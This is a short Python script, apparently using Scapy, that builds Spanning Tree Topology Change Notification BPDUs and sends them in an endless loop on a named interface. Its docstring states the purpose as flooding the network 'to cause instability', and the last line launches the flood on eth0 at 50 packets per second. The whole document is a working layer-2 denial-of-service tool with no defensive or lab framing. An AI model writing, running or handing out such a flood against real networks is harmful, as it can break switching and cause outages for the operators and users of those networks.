def tcn_flood_attack(interface, flood_rate=10):
    """
    Flood network with TCN BPDUs to cause instability
    """
    print(f"[+] Starting TCN flood attack at {flood_rate} packets/second")
    
    # Create TCN BPDU
    tcn_bpdu = (
        Dot3(dst="01:80:c2:00:00:00") /
        LLC(dsap=0x42, ssap=0x42, ctrl=3) /
        STP(
            proto=0x0000,           # STP Protocol ID
            version=0x00,           # STP Version  
            bpdutype=0x80           # TCN BPDU Type
            # TCN BPDUs only have protocol, version, and type fields
        )
    )
    
    packet_count = 0
    start_time = time.time()
    
    try:
        while True:
            sendp(tcn_bpdu, iface=interface, verbose=0)
            packet_count += 1
            
            # Control flood rate
            elapsed = time.time() - start_time
            expected_packets = elapsed * flood_rate
            
            if packet_count > expected_packets:
                time.sleep(0.1)
            
            if packet_count % 100 == 0:
                print(f"[+] Sent {packet_count} TCN BPDUs")
                
    except KeyboardInterrupt:
        print(f"[+] TCN flood stopped. Total packets sent: {packet_count}")

# Execute TCN flood
tcn_flood_attack("eth0", flood_rate=50)
